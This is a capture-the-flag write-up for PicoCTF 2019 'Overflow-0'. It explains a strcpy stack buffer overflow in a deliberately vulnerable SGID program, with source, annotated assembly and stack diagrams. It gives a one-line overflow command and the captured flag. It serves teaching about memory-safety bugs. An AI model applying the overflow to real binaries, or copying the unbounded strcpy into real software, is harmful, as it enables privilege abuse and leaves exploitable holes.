# PicoCTF 2019 - Overflow-0
Author: PinkNoize

Binary Exploitation - 100

> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_4_e130f4df1710865981d50f778a8059f7 on the shell server.

## TL;DR

This challenge provides a program that prints the flag after a segfault occurs. The solution is to overflow the return address in the `vuln` function to cause the segfault.

# Writeup

As with some of the other challenges, this challenge directs us to a directory containing a vulnerable program, the source of the program and the flag file.

```bash
user@pico-2019-shell1:/problems/overflow-0_4_e130f4df1710865981d50f778a8059f7$ cd /problems/overflow-0_4_e130f4df1710865981d50f778a8059f7
user@pico-2019-shell1:/problems/overflow-0_4_e130f4df1710865981d50f778a8059f7$ ls -al
total 92
drwxr-xr-x   2 root       root          4096 Sep 28  2019 .
drwxr-x--x 684 root       root         69632 Oct 10  2019 ..
-r--r-----   1 hacksports overflow-0_4    27 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports overflow-0_4  7644 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports     814 Sep 28  2019 vuln.c
```

The vulnerable program, `vuln`, runs with SGID and can therefore read `flag.txt`.

Let's start by reading the source code.

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```

The program start in `main()` and reads the flag from `flag.txt` into the character array `flag`. The program then sets up a signal handler, `sigsegv_handler()`, for the `SIGSEGV` signal. This means that when the program receives a `SIGSEGV` signal, the program will be interrupted and jump to the `sigsegv_handler()` function. In `sigsegv_handler()` we can see that the flag is printed, so to complete the challenge we have to make the program receive a `SIGSEGV` signal.

The `SIGSEGV` signal is sent to a process (running program) when that process tries to access memory that does not have the permission that the action requires which is known as a [segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault). For example, this can happen when a process tries to write to a section of memory that does not have write permissions or when a process tries to execute memory that does not have execute permissions. Therefore, in order to get the flag we have to cause the process to try to access memory that it shouldn't access.

The next function calls
```c
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
```
are used to set the group permissions so that they will be retained if a shell spawning exploit is used.

After that, if an argument is passed to the program, `vuln()` is called with the 1st argument passed to it. `vuln()` allocates an array of size 128, `buf`, then copies the argument into `buf` using `strcpy()`. As documented by the man page, `strcpy()` is a dangerous function to use as it is not informed on the size of the buffer.

```
STRCPY(3)                                      Linux Programmer's Manual                                      STRCPY(3)

NAME
       strcpy, strncpy - copy a string

SYNOPSIS
       #include <string.h>

       char *strcpy(char *dest, const char *src);
...
BUGS
       If  the  destination  string  of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-
       length string buffers is a favorite cracker technique for taking complete control of the machine.   Any  time  a
       program  reads  or  copies data into a buffer, the program first needs to check that there's enough space.  This
       may be unnecessary if you can show that overflow is impossible, but be careful: programs can  get  changed  over
       time, in ways that may make the impossible possible.
```

Using this information, if we pass a string longer than 128 characters as the first argument, the process will write outside the memory allocated for `buf`. To understand why writing outside `buf` is dangerous, we first have to understand how functions are called and where local variables are placed. This will require a little bit of [assembly](https://en.wikipedia.org/wiki/X86_assembly_language).

We can dump the assembly using `objdump` the -M flag selects the syntax for the assembly

```bash
user@pico-2019-shell1:/problems/overflow-0_4_e130f4df1710865981d50f778a8059f7$ objdump -d vuln -M intel
```

The left column is the address of the instruction in hex, the middle is the hex representation of the machine code, and the right column are the assembly instructions.

Before we can begin our assembly analysis, a few assembly concepts need to be established.

In the CPU, there are several general purpose registers. A register is a thing that stores values. There are several specialized registers such as `eip`, `esp`, and `ebp`. The `eip` points to the current instruction and increments after completing an instruction. The `esp` register keeps track of the bottom of the stack. The stack is used to store local variables (function variables) and keep track of function calls. When a function is called it creates a **stack frame** and puts it on the *bottom* of the stack. When that function returns, the **stack frame** is removed from the stack. This is similar to placing and removing a card from an upside down stack of cards. The **stack frame** contains the function's arguments, the return address, the previous function's base pointer (this is the start of the previous stack frame), backed up registers and local variables. The `ebp` register is used as a reference to find items in the stack frame.

```
High Addresses
                /-----------------------\
                | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
                |       Arguments       |
                |-----------------------|
                |     Return Address    |
    Current     |-----------------------|
    Stack       | Previous Base Pointer | <-- ebp
    Frame       |-----------------------|
                |  Backed up Registers  | 
                |-----------------------|
                |    Local Variables    | <-- esp
                \-----------------------/
Low Addresses
```

If we go to the assembly for the call to `vuln()`, we can understand how the stack is setup and how we can trigger a `SEGSEGV`.

```gas
8048773:       8b 46 04                mov    eax,DWORD PTR [esi+0x4]
8048776:       83 c0 04                add    eax,0x4
8048779:       8b 00                   mov    eax,DWORD PTR [eax]
804877b:       83 ec 0c                sub    esp,0xc
804877e:       50                      push   eax
804877f:       e8 14 ff ff ff          call   8048698 <vuln>
8048784:       83 c4 10                add    esp,0x10
```
The first three instructions are used to place the contents of `argv[1]` into `eax`. The 4th instruction is an optimization that aligns the stack. The fifth instruction pushes the first argument onto the stack, which begins the stack frame for the `vuln()` function. At this point the stack looks like ...

```
                /-----------------------\
[esp+4]         | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
[esp+0]         |       argv[1]         | <-- esp
```

The `vuln()` function is then called. The `call` instruction pushes the address of the next instruction to the stack and jumps to the specified location (eip = 0x8048698). The stack is now ...

```
                /-----------------------\
[esp+8]         | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
[esp+4]         |       argv[1]         |
                |-----------------------|
[esp+0]         |      0x8048784        | Return Address <-- esp
```

We now must analyze `vuln()` to determine where `buf` is placed and how its placement allows us to cause a `SIGSEGV` (and much worse things).

```
08048698 <vuln>:
8048698:       55                      push   ebp
8048699:       89 e5                   mov    ebp,esp
804869b:       53                      push   ebx
804869c:       81 ec 84 00 00 00       sub    esp,0x84
```

The first instruction saves the base pointer of the previous frame. The second instruction sets `ebp` to where the current base pointer should be. This will be used to find function arguments and local variables later. The third instruction backs up the ebx register so that its value can be restored at the end of the function. The 4th instruction allocates the space for the `buf` variable. You might notice that 0x84 = 132 which is bigger than the 128 specified in the C code. This is to keep the stack aligned. The stack frame is complete and the stack now looks like ...

```
                /-----------------------\
                | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
[ebp+8]         |       argv[1]         |
                |-----------------------|
                |      0x8048784        | Return Address
                |-----------------------|
                |     Previous ebp      | <-- ebp
                |-----------------------|
                |     Backed up ebx     |
                |-----------------------|
                |     Unused Memory     |
                |-----------------------|
                |      End of buf       |
                            .
                            .           
                            .           
[ebp-0x88]      |     Start of buf      | <-- esp
                \-----------------------/
```

Now that the stack frame is complete, we can see how we can cause a segfault. If we can overwrite the return address with garbage when `vuln()` returns, the process will try to execute un-executable memory causing a segfault. This is easier done than said.

```bash
user@pico-2019-shell1:/problems/overflow-0_4_e130f4df1710865981d50f778a8059f7$ ./vuln $(python -c "print('a'*144)")
picoCTF{3asY_P3a5y2f814ddc}
```

After the strcpy, the stack looks like this ...
```
                /-----------------------\
                | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
[ebp+8]         |       argv[1]         |
                |-----------------------|
                |         aaaa          | Return Address
                |-----------------------|
                |         aaaa          | <-- ebp
                |-----------------------|
                |         aaaa          |
                |-----------------------|
                |         aaaa          |
                |-----------------------|
                |         aaaa          |
                            .
                            .           
                            .           
[ebp-0x88]      |         aaaa          | <-- esp
                \-----------------------/
```

This technique of overwriting the return address can also be combined with the shellcode of [handy-shellcode](handyShellcode.md) to produce an exploit that spawns a shell. This is useful when there isn't a magical function that prints the flag for you.
